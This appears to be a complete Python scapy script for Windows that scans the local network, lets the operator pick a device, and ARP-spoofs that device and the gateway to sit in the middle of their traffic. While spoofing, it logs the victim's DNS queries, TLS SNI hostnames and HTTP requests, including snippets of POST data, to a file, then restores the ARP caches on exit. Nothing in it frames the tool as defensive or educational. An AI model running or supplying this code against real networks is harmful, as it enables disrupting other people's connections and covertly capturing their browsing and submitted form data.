from scapy.all import ARP, Ether, send, srp, sniff, DNSQR, TCP, IP
from scapy.layers.tls.handshake import TLSClientHello
import socket
import subprocess
import os
import threading
import time
import datetime

LOG_FILE = "logs.txt"

def log_event(event):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        f.write(f"{timestamp} {event}\n")

# Detect default gateway (Windows)
def get_default_gateway():
    try:
        output = subprocess.check_output("route print 0.0.0.0", shell=True, encoding='mbcs')
        for line in output.splitlines():
            if "0.0.0.0" in line:
                parts = line.split()
                if len(parts) >= 4:
                    return parts[2]
    except Exception as e:
        print(f"Error finding gateway: {e}")
    return None

# Scan network using ARP
def scan_network(gateway_ip):
    ip_range = gateway_ip.rsplit('.', 1)[0] + '.1/24'
    print(f"[+] Scanning network: {ip_range}")
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]

    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    return clients

# Get hostname by reverse DNS or nbtscan
def get_hostname(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        if hostname and hostname != ip:
            return hostname
    except:
        pass

    # Try nbtscan (Windows)
    try:
        result = subprocess.check_output(f'nbtstat -A {ip}', shell=True, stderr=subprocess.DEVNULL, encoding='utf-8')
        for line in result.splitlines():
            if "<00>" in line and "UNIQUE" in line:
                parts = line.strip().split()
                if len(parts) >= 1:
                    return parts[0]
    except:
        pass

    return "Unknown"

# Display devices with hostname
def display_devices(devices):
    print("\nConnected Devices:")
    print("Index\tIP Address\t\tMAC Address\t\tHostname")
    print("-" * 80)
    for i, device in enumerate(devices):
        hostname = get_hostname(device['ip'])
        print(f"{i}\t{device['ip']:<16}\t{device['mac']:<20}\t{hostname}")
    print("-" * 80)

# Spoof ARP
def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

# Restore ARP
def restore(target_ip, target_mac, router_ip, router_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    send(packet, count=5, verbose=0)

# Get MAC from IP
def get_mac(ip):
    try:
        from scapy.layers.l2 import arping
        ans, _ = arping(ip, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        pass
    return None

# Sniff callback
def packet_callback(pkt):
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst

        # DNS detection
        if pkt.haslayer(DNSQR):
            domain = pkt[DNSQR].qname.decode()
            msg = f"[DNS] {ip_src} queried {domain}"
            print(msg)
            log_event(msg)

        # HTTP detection
        if pkt.haslayer(TCP) and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80):
            raw = bytes(pkt[TCP].payload)
            if raw:
                try:
                    payload = raw.decode('utf-8', errors='ignore')
                    if "Host:" in payload:
                        lines = payload.split('\r\n')
                        host = next((l[6:] for l in lines if l.startswith("Host:")), "")
                        method_line = lines[0] if lines else ""
                        post_data = ""
                        if "POST" in method_line and "\r\n\r\n" in payload:
                            post_data = payload.split("\r\n\r\n", 1)[1][:100]
                        msg = f"[HTTP] {ip_src} -> {ip_dst} Host: {host} | Req: {method_line}"
                        if post_data:
                            msg += f" | Data: {post_data}"
                        print(msg)
                        log_event(msg)
                except:
                    pass

        # TLS SNI
        if pkt.haslayer(TLSClientHello):
            try:
                sni_list = pkt[TLSClientHello].extensions.server_names
                if sni_list:
                    for sni in sni_list:
                        msg = f"[TLS SNI] {ip_src} -> {ip_dst} SNI: {sni.data.decode()}"
                        print(msg)
                        log_event(msg)
            except Exception:
                pass

# Start sniffing
def start_sniffing():
    sniff(filter="ip", prn=packet_callback, store=0)

if __name__ == "__main__":
    if os.name != "nt":
        print("[!] This script is designed for Windows only.")
        exit()

    print("[*] Detecting default gateway...")
    gateway_ip = get_default_gateway()
    if not gateway_ip:
        print("[!] Could not detect gateway.")
        exit()

    print(f"[+] Gateway IP: {gateway_ip}")
    devices = scan_network(gateway_ip)
    if not devices:
        print("[!] No devices found.")
        exit()

    display_devices(devices)

    try:
        index = int(input("[*] Enter index of target device to disconnect: "))
        target = devices[index]
    except (ValueError, IndexError):
        print("[!] Invalid index.")
        exit()

    target_ip = target['ip']
    target_mac = target['mac']
    router_mac = get_mac(gateway_ip)

    if not target_mac or not router_mac:
        print("[!] MAC resolution failed.")
        exit()

    print("[*] Sniffing in background (DNS, HTTP, TLS SNI)...")
    sniff_thread = threading.Thread(target=start_sniffing, daemon=True)
    sniff_thread.start()

    print(f"[+] Spoofing {target_ip}... Press Ctrl+C to stop.")
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, router_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring network...")
        restore(target_ip, target_mac, gateway_ip, router_mac)
        restore(gateway_ip, router_mac, target_ip, target_mac)
        print("[+] Done. Logs saved to logs.txt.")